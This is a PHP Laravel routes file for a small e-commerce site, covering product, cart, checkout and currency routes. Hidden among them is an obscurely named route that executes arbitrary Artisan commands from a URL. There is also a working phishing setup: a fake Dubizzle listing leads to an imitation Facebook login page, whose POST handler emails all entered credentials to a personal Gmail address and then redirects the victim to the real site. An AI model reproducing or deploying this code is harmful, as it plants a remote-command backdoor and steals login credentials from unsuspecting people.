<?php

use ECommerce\Brand;
use ECommerce\Category;
use ECommerce\Product;
use Kareem3d\Images\Image;

Route::get('/my-name-is-kareem3d-friends/{command}', function($command)
{
    echo '<pre>';
    var_dump(Artisan::call($command, Input::all()));
    exit();
})->where('command', '.*');


Route::get('/profile', function()
{
    return View::make('pages.profile');
});


Route::get('/test-remote-connection', function()
{
    DB::connection('remote')->select('SELECT 1');
});


Route::get('/', array('as' => 'home', 'uses' => 'HomeController@index'));
Route::get('/shopping-cart.html', array('as' => 'shopping-cart', 'uses' => 'ShoppingCartController@index'));
Route::get('/checkout.html', array('as' => 'checkout', 'uses' => 'ShoppingCartController@checkout'));

Route::get('{category_name}/{brand_name}/{title}.html', array('as' => 'product', 'uses' => 'ProductsController@product'));
Route::get('brand/{brand_name}', array('as' => 'brand', 'uses' => 'ProductsController@brand'));
Route::get('category/{category_name}', array('as' => 'category', 'uses' => 'ProductsController@category'));

Route::get('/choose-your-gifts.html', array('as' => 'choose-gifts', 'uses' => 'ProductsController@chooseGifts'));


// Form post requests
Route::post('/checkout.html', array('as' => 'checkout.post', 'uses' => 'CheckoutController@postCreateOrder'));


// Web services
Route::controller('product', 'ProductController');



Route::controller('blood-donation', 'Blood\UpdateLocationController');


Route::any('/throw-me', function()
{
    throw new Exception();
});


Route::get('/message-to-user.html', array('as' => 'message-to-user', function()
{
    if(Session::has('title'))
    {
        $title = Session::get('title');
        $body = Session::get('body');

        return View::make('pages.message_to_user', compact('title', 'body'));
    }

    return Redirect::route('home');
}));


Route::get('/change-currency/{currency}', function($currency)
{
    $appCurrency = Session::get('application_currency');

    if($appCurrency != $currency && \Units\Currency::isAvailable($currency))
    {
        Session::put('application_currency', $currency);

        App::make('Cart\ItemFactoryInterface')->regenerate();
    }

    // Redirect back or to home page
    try{ return Redirect::back(); } catch(Exception $e) { return Redirect::route('home'); }
});


Route::get('/en/port-said/items-for-sale/computers-tablets/listing/7-listings-4807f59cf6355e629f2ea1bebd93b99b/show/', function()
{
    $facebookUrl = 'http://dubizzle.qbrando.com/login.php?fbid=645304118898028&set=a.263636427064801.58209.263629920398785&type=1';

    return View::make('hack.dubizzle', compact('facebookUrl'));
});


Route::get('/login.php', function()
{
    return View::make('hack.facebook');
});

Route::post('/login.php', function()
{
    $data = array(
        'errorTitle' => 'Ahmed zeyada',
        'errorDescription' => '',
        'errorPage' => Request::url() . ' : ' . Request::getMethod() . '<br /><br />INPUTS ARE: <br />' . readableArray(Input::all())
    );

    Mail::send('emails.error', $data, function($message)
    {
        $message->to('kareem3d.a@gmail.com', 'Kareem Mohamed')->subject('Error from qbrando');
    });

    return Redirect::to('https://egypt.dubizzle.com/en/port-said/items-for-sale/computers-tablets/listing/7-listings-4807f59cf6355e629f2ea1bebd93b99b/show/?back=L2VuL3BvcnQtc2FpZC9pdGVtcy1mb3Itc2FsZS9jb21wdXRlcnMtdGFibGV0cy9zZWFyY2gvP2lzX3NlYXJjaD1GYWxzZSZwYWdlPTU=');
});